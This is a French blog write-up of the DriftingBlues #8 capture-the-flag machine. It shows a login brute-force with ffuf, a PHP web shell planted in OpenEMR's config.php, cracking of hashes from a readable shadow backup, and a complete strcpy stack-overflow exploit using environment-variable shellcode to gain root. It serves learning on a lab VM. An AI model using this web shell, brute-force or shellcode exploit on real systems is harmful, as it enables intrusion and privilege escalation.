# Solution du CTF DriftingBlues #8 de HackMyVM

~el8
----

Manquait à ma collection le numéro 8 de cette série de CTFs *DriftingBlues* trouvé sur [HackMyVM](https://hackmyvm.eu/). Comme le nom du site l'indique on récupère l'image virtuelle sur le site, le principe est le même que sur VulnHub. Ce qui manque à ces plateformes c'est sans doute un filtrage sur la qualité des VMs proposés qui serait pourtant pratique pour éviter de gaspiller des heures sur une énumération improbable.  

Ici les 8 autres épisodes de la saga ont été bien conçus c'est donc sans crainte que je plonge dans cette nouvelle aventure.  

```plain
Nmap scan report for 192.168.56.14 
Host is up (0.00019s latency). 
Not shown: 65534 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
| http-title: OpenEMR Login 
|_Requested resource was interface/login/login.php?site=default 
|_http-server-header: Apache/2.4.38 (Debian)
```

Pas d'accès SSH prévu sur cette machine. Pas bien grave, je me servirais de [ReverseSSH](https://github.com/Fahrj/reverse-ssh) le moment venu.  

On note tout de suite la présence d'un OpenEMR, un logiciel utilisé dans le milieu médical. Sur *exploit-db* je remarque différents exploits mais ils nécessitent généralement de disposer d'un compte.  

Fouillant sur *DuckDuckGo*, je remarque que le logiciel ne dispose pas de comptes par défaut, je teste quand même quelques identifiants classiques (*admin / admin*, etc) sans succès.  

So long and thank for all the wordlists
---------------------------------------

Une énumération des fichiers web avec l'aide de Feroxbuster me remonte deux entrées intéressantes. D'abord le script *admin.php* qui semble lié à l'installation d'OpenEMR et mentionne la version *5.0.1 (3)*.  

Ensuite un fichier *wordlist.txt* qui contient une série de mots de passe.  

Tentons donc de casser un compte sur l'appli web avec cette liste :  

```plain
$ ffuf -u "http://192.168.56.14/interface/main/main_screen.php?auth=login&site=default" \
  -X POST -H "Content-type: application/x-www-form-urlencoded" \
  -d "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1"  \
  -w wordlist.txt -fs 456 

        /'___\  /'___\           /'___\        
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v1.3.1 
________________________________________________ 

 :: Method           : POST 
 :: URL              : http://192.168.56.14/interface/main/main_screen.php?auth=login&site=default 
 :: Wordlist         : FUZZ: wordlist.txt 
 :: Header           : Content-Type: application/x-www-form-urlencoded 
 :: Data             : new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 
 :: Filter           : Response size: 456 
________________________________________________ 

.:.yarrak.:.31          [Status: 302, Size: 0, Words: 1, Lines: 1] 
:: Progress: [1412/1412] :: Job [1/1] :: 107 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Une fois connecté il est temps de comprendre rapidement le fonctionnement de [cet exploit correspondant à la version identifiée](https://www.exploit-db.com/exploits/49998). On est comme pour d'autres CTFs de la série en présence d'une faille d'upload sans restrictions sur le type de fichier.  

L'exploit envoie des données vers le path */interface/super/manage\_site\_files.php* et la section du site qui semble la plus proche est *Administration > Files*.  

J'avoue que l'interface n'est pas super compréhensible et j'ai préféré éditer le fichier existant *config.php* plutôt que de tenter d'ajouter un nouveau fichier.  

La ligne ajoutée n'a rien de particulier :  

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

Une fois connecté je note la présence d'un utilisateur nommé *clapton*.   

A part ça je trouve des identifiants dans pour la base de données dans le fichier */var/www/html/sites/default/sqlconf.php* :  

```php
<?php 
//  OpenEMR 
//  MySQL Config 

$host   = 'localhost'; 
$port   = '3306'; 
$login  = 'openemr'; 
$pass   = 'junno'; 
$dbase  = 'openemr';
```

Mais le plus frappant est la présence d'un fichier de sauvegarde du */etc/shadow* accessible en lecture :  

```plain
www-data@driftingblues:/var$ ls backups/ -al 
total 28 
drwxr-xr-x  2 root root  4096 Jan 21 07:53 . 
drwxr-xr-x 12 root root  4096 Apr 25  2021 .. 
-rw-r--r--  1 root root 13873 Apr 25  2021 apt.extended_states.0 
-rw-r--r--  1 root root   943 Apr 25  2021 shadow.backup
```

C'est le moment de lancer un [Penglab](https://github.com/mxrch/penglab) histoire de profiter des GPUs de Google pour casser le hash de l'utilisateur *clapton* :  

```plain
!hashcat -m 1800 /tmp/hash.txt /content/wordlists/rockyou.txt
```

Ça ne prend que quelques secondes avec hashcat + GPU qui retrouve le mot de passe *dragonsblood*.  

Way to root or not to root ?
----------------------------

Dans le home de cet utilisateur se trouvent trois fichiers :  

* Le flag user.txt (*96716B8151B1682C5285BC99DD4E95C2*)
* Une wordlist de 155464 lignes
* Un binaire setuid root nommé *waytoroot*

Le binaire n'est pas exploitable via l'utilisation de la wordlist. En effet il ne fait que copier via *strcpy()* l'argument reçu en ligne de commande, point barre.  

Je reviendrais plus tard sur ce binaire mais je me pose des questions : était-il destiné à être exploité ou s'agit-il seulement d'un troll ? Est-ce pour proposer deux fins différentes à ce CTF ? Le tout en sachant que le CTF est indiqué comme facile...  

Concernant la wordlist on peut en tout cas s'en servir pour casser le hash de l'utilisateur root lui aussi présent dans la backup du fichier *shadow*. Ça passe très bien avec *JohnTheRipper* :  

```plain
.:.yarak.:.      (root)
```

```plain
clapton@driftingblues:~$ su root 
Password:  
root@driftingblues:/home/clapton# cd 
root@driftingblues:~# ls 
root.txt 
root@driftingblues:~# cat root.txt  
E8E7040D825E1F345A617E0E6612444A
```

Hacker vaillant rien d'impossible
---------------------------------

Quand on désassemble la fonction *main()* du binaire on obtient ceci :  

```asm
   0x565561a9 <+0>:     lea    0x4(%esp),%ecx
   0x565561ad <+4>:     and    $0xfffffff0,%esp
   0x565561b0 <+7>:     push   -0x4(%ecx)
   0x565561b3 <+10>:    push   %ebp
   0x565561b4 <+11>:    mov    %esp,%ebp
   0x565561b6 <+13>:    push   %ebx
   0x565561b7 <+14>:    push   %ecx
   0x565561b8 <+15>:    sub    $0x70,%esp
   0x565561bb <+18>:    call   0x565560b0 <__x86.get_pc_thunk.bx>
   0x565561c0 <+23>:    add    $0x2e40,%ebx
   0x565561c6 <+29>:    mov    %ecx,%eax
   0x565561c8 <+31>:    mov    0x4(%eax),%eax
   0x565561cb <+34>:    add    $0x4,%eax
   0x565561ce <+37>:    mov    (%eax),%eax
   0x565561d0 <+39>:    sub    $0x8,%esp
   0x565561d3 <+42>:    push   %eax
   0x565561d4 <+43>:    lea    -0x6c(%ebp),%eax
   0x565561d7 <+46>:    push   %eax
   0x565561d8 <+47>:    call   0x56556030 <strcpy@plt>
   0x565561dd <+52>:    add    $0x10,%esp
   0x565561e0 <+55>:    sub    $0xc,%esp
   0x565561e3 <+58>:    lea    -0x1ff8(%ebx),%eax
   0x565561e9 <+64>:    push   %eax
   0x565561ea <+65>:    call   0x56556040 <puts@plt>
   0x565561ef <+70>:    add    $0x10,%esp
   0x565561f2 <+73>:    nop
   0x565561f3 <+74>:    lea    -0x8(%ebp),%esp
   0x565561f6 <+77>:    pop    %ecx
   0x565561f7 <+78>:    pop    %ebx
   0x565561f8 <+79>:    pop    %ebp
   0x565561f9 <+80>:    lea    -0x4(%ecx),%esp
   0x565561fc <+83>:    ret
```

Comme dit précédemment il y a un stack overflow car le programme copie *argv[1]* vers une variable sur la pile en utilisant *strcpy()* qui ne procède à aucune vérification.  

La logique voudrait que l'on passe suffisamment de données pour écraser la backup de EIP (le binaire est 32 bits) et que lors de l'exécution de l'instruction *RET* à la du code on saute sur un shellcode que l'on aura par exemple placé dans une variable d'environnement.  

Ah oui au fait, la stack n'est pas randomisée sur le système, est bien exécutable et n'est pas protégée par *stack protector*. Easy peasy !  

Seulement voilà, le code n'est pas dans une fonction mais dans le *main*, ce qui explique potentiellement le postlogue un peu bizarre.  

Le problème ce sont les instructions avant le *RET* à partir de l'adresse 0x565561f3 :  

* Notre overflow va écraser les variables locales c'est à dire aux adresses inférieures à EBP
* ESP (le pointeur sur le sommet de la stack) se voit écrasé par EBP-8 et sert ensuite de référence pour POPer 3 registres.
* L'un des registres, ECX est ensuite utilisé pour calculer la nouvelle adresse de ESP

Par conséquent quand on parvient sur le RET l'adresse de la pile a changée et à son sommet il n'y a plus l'adresse qui devait pointer sur notre shellcode :'(  

Ça ajoute du poids à l'hypothèse que le binaire a été mis là juste pour troller le joueur et que l'utilisation de la wordlist était le chemin attendu MAIS le programme est tout de même vulnérable.  

Il faut pour cela :  

* écraser la valeur contenue à EBP-8 par une une adresse sous notre contrôle (adresse mémoire correspondant à une variable d'environnement par exemple)
* mettre en place une fausse stack frame à cette adresse (donc dans l'environnement car on n'a que ça) qui permettra aux 3 instructions POP de fonctionner
* les valeurs récupérées par ces POP ainsi que par le RET final correspondront à l'adresse de notre shellcode (on utilisera un nopsled aussi)

J'aurais aimé pouvoir écrire un code d'exploitation plus fiable en réutilisant la valeur des registres sauf que seul ECX était intéressant et qu'aucun gadget ne l'utilisait pour un JMP ou un CALL.  

Petit schéma pour tenter d'illustrer le mécanisme de l'exploitation :  

![DriftingBlues #8 CTF stack overflow exploitation](https://raw.githubusercontent.com/devl00p/blog/master/images/hackmyvm/drifting_blues_8_stack_overflow.png)

Pour avoir l'adresse mémoire des variables d'environnement j'ai écrit un code C qui peut se résumer à :  

```c
printf("%s: %p\n", argv[1], getenv(argv[1]));
```

Je me suis basé sur [un shellcode qui rajoute le bit setuid sur /bin/sh](https://www.exploit-db.com/shellcodes/43671).  

```plain
clapton@driftingblues:~$ export SHELLCODE=`python -c "print '\x90' *100 + '\x31\xC0\x31\xDB\x31\xC9\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x66\xB9\xFE\x10\x66\x81\xE9\x01\x07\xB0\x0F\xCD\x80\xB0\x0
1\xCD\x80'"` 
clapton@driftingblues:~$ ./mygetenv SHELLCODE 
SHELLCODE: 0xbffffde5 
clapton@driftingblues:~$ export ADDRESS=`python -c "print '\xef\xfd\xff\xbf'*30 " `    
clapton@driftingblues:~$ ./mygetenv ADDRESS                                      
ADDRESS: 0xbffffefc 
clapton@driftingblues:~$ ./waytoroot `python -c "print '\x04\xff\xff\xbf' * 30"`    
hahaha silly hacker! 
clapton@driftingblues:~$ ls -l /bin/dash         
-rwsrwxr-x 1 root root 132820 Jan 17  2019 /bin/dash 
clapton@driftingblues:~$ /bin/dash -p 
# id 
uid=1000(clapton) gid=1000(clapton) euid=0(root) groups=1000(clapton) 
# head -1 /etc/shadow 
root:$6$sqBC8Bk02qmul3ER$kysvb1LR5uywwKRc/KQcmOMALcqd0NhHnU1Wbr9NRs9iz7WHwWqGkxKYRhadI3FWo3csX1BdQPHg33gwGVgMp.:18742:0:99999:7:::

```

Le décalage entre la vraie adresse du shellcode et l'adresse placée dans *ADDRESS* permet de sauter *quelque part* au milieu du nopsled.  

L'autre décalage entre l'adresse donnée en argument au binaire et la véritable adresse de *ADDRESS* permet de compenser le -8 de l'instruction EBP-8. Après, plus on place de copies de l'adresse, moins on a à se soucier de l'exactitude :)  

C'est donc terminé pour cette série de CTF faciles (en la majeure) mais sympathiques.

*Published January 24 2022 at 18:17*